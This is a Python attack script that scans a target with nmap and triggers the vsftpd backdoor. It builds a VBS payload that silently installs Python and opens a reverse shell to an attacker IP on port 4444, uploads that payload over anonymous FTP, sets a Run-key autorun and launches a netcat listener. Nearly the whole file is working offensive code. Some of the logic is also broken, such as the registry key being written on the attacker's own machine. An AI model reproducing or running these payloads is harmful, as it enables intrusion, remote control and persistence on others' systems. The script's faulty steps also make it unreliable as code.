import nmap
import socket
import time
import os
from ftplib import FTP
import subprocess
import ctypes

# Configuration
TARGET_IP = '192.168.1.10'
ATTACKER_IP = '192.168.1.9'
REVERSE_PORT = 4444

def scan_ports(target_ip):
    print("[*] Scanning ports on target...")
    popup_notification("Scanning ports on target...")
    nm = nmap.PortScanner()
    nm.scan(target_ip, '1-1024', arguments='-sV')
    ports = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            for port in nm[host][proto].keys():
                service = nm[host][proto][port]
                ports.append({
                    'port': port,
                    'name': service.get('name', ''),
                    'product': service.get('product', ''),
                    'version': service.get('version', '')
                })
    return ports

def exploit_vsftpd(target_ip, port):
    print(f"[!] Attempting vsftpd backdoor exploit on {target_ip}:{port}")
    popup_notification(f"Attempting vsftpd backdoor exploit on {target_ip}:{port}")
    try:
        s = socket.socket()
        s.connect((target_ip, port))
        s.recv(1024)
        s.send(b'USER backdoor:)\r\n')
        time.sleep(1)
        s.send(b'PASS pass\r\n')
        s.close()
        print("[+] Exploit sent. If vulnerable, backdoor opens on port 6200.")
        popup_notification("Exploit sent. Check for backdoor on port 6200.")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        popup_notification("Exploit failed.")

def create_vbs_script():
    print("[*] Creating VBS reverse shell payload...")
    popup_notification("Creating VBS reverse shell payload...")
    script = f""" 
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")
    On Error Resume Next
    Set objExec = objShell.Exec("python --version")
    If Err.Number <> 0 Then
        objShell.Run "cmd /c powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.9.0/python-3.9.0.exe', 'python_installer.exe')", 0, True
        objShell.Run "cmd /c python_installer.exe /quiet InstallAllUsers=1 PrependPath=1", 0, True
        WScript.Sleep 5000
    End If
    objShell.Run "cmd /c python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ATTACKER_IP}',{REVERSE_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\"", 0, False
    """
    with open("payload.vbs", "w") as f:
        f.write(script)
    return "payload.vbs"

def upload_and_execute_vbs(target_ip, filename):
    print("[*] Connecting to FTP to upload payload...")
    popup_notification("Uploading payload via FTP...")
    try:
        ftp = FTP(target_ip)
        ftp.login()
        with open(filename, "rb") as file:
            ftp.storbinary(f"STOR {filename}", file)
        ftp.quit()
        print("[+] File uploaded via FTP.")
        popup_notification("File uploaded via FTP.")
        
        # Add the autorun mechanism here
        print("[*] Attempting to set autorun on the target machine...")
        set_autorun(target_ip)
        
        print("[!] You now need to manually trigger execution on the target (e.g., if target auto-runs files or through remote command).")
    except Exception as e:
        print(f"[-] FTP upload failed: {e}")
        popup_notification("FTP upload failed.")

def set_autorun(target_ip):
    print("[*] Attempting to set autorun registry key on target machine...")
    try:
        # This adds the VBS file to the registry so it runs on startup (for Windows)
        registry_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MyPayload" /t REG_SZ /d "C:\\Users\\Public\\payload.vbs" /f'
        subprocess.call(["cmd", "/C", registry_command])  # Running the registry key
        print("[+] Autorun set successfully.")
        popup_notification("Autorun set successfully.")
    except Exception as e:
        print(f"[-] Failed to set autorun: {e}")
        popup_notification("Failed to set autorun.")

def start_listener():
    print(f"[*] Starting listener on port {REVERSE_PORT} (make sure netcat is installed)...")
    popup_notification(f"Starting listener on port {REVERSE_PORT}...")
    try:
        subprocess.call(['x-terminal-emulator', '-e', f'nc -lvnp {REVERSE_PORT}'])
    except:
        print("[!] Could not launch new terminal, please run manually:")
        print(f" nc -lvnp {REVERSE_PORT}")

def popup_notification(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Notification", 0)

def main():
    ports = scan_ports(TARGET_IP)
    print("[+] Open ports found:")
    for p in ports:
        print(f" - Port {p['port']}: {p['name']} {p['product']} {p['version']}")
        if 'vsftpd' in p['product'].lower():
            exploit_vsftpd(TARGET_IP, p['port'])
    vbs_filename = create_vbs_script()
    upload_and_execute_vbs(TARGET_IP, vbs_filename)
    start_listener()

if __name__ == "__main__":
    main()
